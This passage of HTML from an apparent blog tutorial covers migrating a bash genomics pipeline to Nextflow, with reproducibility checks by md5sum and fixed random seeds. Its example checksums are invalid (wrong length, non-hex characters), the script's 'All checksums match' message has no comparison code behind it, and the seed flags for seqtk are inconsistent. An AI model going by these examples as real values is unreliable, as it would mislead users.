47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Baseline execution complete. Manifest saved to: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="12-run-the-original-pipeline-multiple-times">1.2 Run the Original Pipeline Multiple Times<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#12-run-the-original-pipeline-multiple-times" class="hash-link" aria-label="Direct link to 1.2 Run the Original Pipeline Multiple Times" title="Direct link to 1.2 Run the Original Pipeline Multiple Times" translate="no">​</a></h3>
<p>Execute the pipeline multiple times with identical inputs to verify determinism:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify pipeline reproducibility</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">RUNS</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">REFERENCE_DIR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/results/baseline"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Running original pipeline </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$RUNS</span><span class="token string" style="color:hsl(119, 34%, 47%)"> times..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">seq</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable number" style="color:hsl(35, 99%, 36%)">1</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> $RUNS</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">OUTPUT_DIR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/results/baseline_run_</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$i</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> original_pipeline.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /tmp/run_</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$i</span><span class="token plain">.log </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare outputs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Reproducibility Check ==="</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/aligned.bam"</span><span class="token plain"> /results/baseline_run_*/aligned.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/marked.bam"</span><span class="token plain"> /results/baseline_run_*/marked.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/variants.vcf"</span><span class="token plain"> /results/baseline_run_*/variants.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract just the checksums and compare</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">BASELINE_ALIGNED</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">md5sum </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE_DIR}</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">/aligned.bam"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -d</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-f1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">BASELINE_MARKED</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">md5sum </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE_DIR}</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">/marked.bam"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -d</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-f1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">BASELINE_VARIANTS</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">md5sum </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE_DIR}</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">/variants.vcf"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -d</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-f1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Baseline checksums:"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  aligned.bam: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_ALIGNED</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  marked.bam: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_MARKED</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  variants.vcf: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_VARIANTS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span></code></pre></div></div>
<p><strong>Expected output if pipeline is deterministic:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">98a4d5f8c7b2e9f3a1d6c4b5 /results/baseline/aligned.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">98a4d5f8c7b2e9f3a1d6c4b5 /results/baseline_run_1/aligned.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">98a4d5f8c7b2e9f3a1d6c4b5 /results/baseline_run_2/aligned.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">98a4d5f8c7b2e9f3a1d6c4b5 /results/baseline_run_3/aligned.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">All checksums match - Pipeline is deterministic!</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="13-document-non-deterministic-tools">1.3 Document Non-Deterministic Tools<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#13-document-non-deterministic-tools" class="hash-link" aria-label="Direct link to 1.3 Document Non-Deterministic Tools" title="Direct link to 1.3 Document Non-Deterministic Tools" translate="no">​</a></h3>
<p>Some bioinformatics tools produce non-deterministic output by design (random seeds, floating-point precision, threading order). <strong>Identify and handle them explicitly:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Tools that need seed control</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># These must be configured with hard-coded seeds</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Example 1: Tools with random sampling (seqtk)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">seqtk sample </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">42</span><span class="token plain"> reads.fastq </span><span class="token number" style="color:hsl(35, 99%, 36%)">0.5</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> sampled.fastq</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Example 2: Tools with randomized output order (bowtie2 with threading)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bowtie2 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--seed</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">42</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-x</span><span class="token plain"> index </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-U</span><span class="token plain"> reads.fastq </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-S</span><span class="token plain"> output.sam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Example 3: Python-based tools with numpy/scipy randomness</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python process.py </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--seed</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">42</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Example 4: R-based tools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># In R script:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">set.seed</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">42</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Create a mapping document:</strong></p>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">#</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Non-Deterministic Tools in Our Pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token table table-header-row punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-header-row table-header important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Tool                </span><span class="token table table-header-row punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-header-row table-header important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Reason                 </span><span class="token table table-header-row punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-header-row table-header important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Solution             </span><span class="token table table-header-row punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-header-row"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token table table-header-row"></span><span class="token table table-line punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-line"> </span><span class="token table table-line punctuation" style="color:hsl(119, 34%, 47%)">-------------------</span><span class="token table table-line"> </span><span class="token table table-line punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-line"> </span><span class="token table table-line punctuation" style="color:hsl(119, 34%, 47%)">----------------------</span><span class="token table table-line"> </span><span class="token table table-line punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-line"> </span><span class="token table table-line punctuation" style="color:hsl(119, 34%, 47%)">--------------------</span><span class="token table table-line"> </span><span class="token table table-line punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-line"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token table table-line"></span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> seqtk sample        </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> Random sampling        </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> Use --seed 42        </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token table table-data-rows"></span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> bowtie2             </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> Thread-based shuffling </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> Use --seed 42        </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token table table-data-rows"></span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> custom_py_script.py </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> numpy random           </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> Set seed in code     </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token table table-data-rows"></span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> variant_filter.R    </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> R randomization        </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows table-data"> set.seed(42) in code </span><span class="token table table-data-rows punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token table table-data-rows"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token table table-data-rows"></span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">All tools must use hard-coded seeds (42 chosen arbitrarily).</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="14-save-the-baseline-manifest">1.4 Save the Baseline Manifest<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#14-save-the-baseline-manifest" class="hash-link" aria-label="Direct link to 1.4 Save the Baseline Manifest" title="Direct link to 1.4 Save the Baseline Manifest" translate="no">​</a></h3>
<p>Create a versioned baseline that future pipelines must match:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># baseline_checksums.txt</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Generated: 2026-02-11T10:30:00Z</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pipeline Version: 1.0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Tools: bwa-0.7.17, samtools-1.18, bcftools-1.18</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aligned.bam:98a4d5f8c7b2e9f3a1d6c4b5e2f3g4h5</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">marked.bam: a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">variants.vcf: x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-migrate-to-nextflow-with-seed-control">Step 2: Migrate to Nextflow with Seed Control<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#step-2-migrate-to-nextflow-with-seed-control" class="hash-link" aria-label="Direct link to Step 2: Migrate to Nextflow with Seed Control" title="Direct link to Step 2: Migrate to Nextflow with Seed Control" translate="no">​</a></h2>
<p>Now migrate your bash pipeline to Nextflow while maintaining deterministic behavior through seed control.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="21-create-nextflow-processes-with-seeds">2.1 Create Nextflow Processes with Seeds<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#21-create-nextflow-processes-with-seeds" class="hash-link" aria-label="Direct link to 2.1 Create Nextflow Processes with Seeds" title="Direct link to 2.1 Create Nextflow Processes with Seeds" translate="no">​</a></h3>
<p>Convert each bash step to a Nextflow process, explicitly setting seeds:</p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// modules/bwa_align.nf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process BWA_ALIGN </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.id"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_high'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">'community.wave.seqera.io/library/bwa_samtools:56c9f8d5201889a4'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path reference</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path reference_index</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token 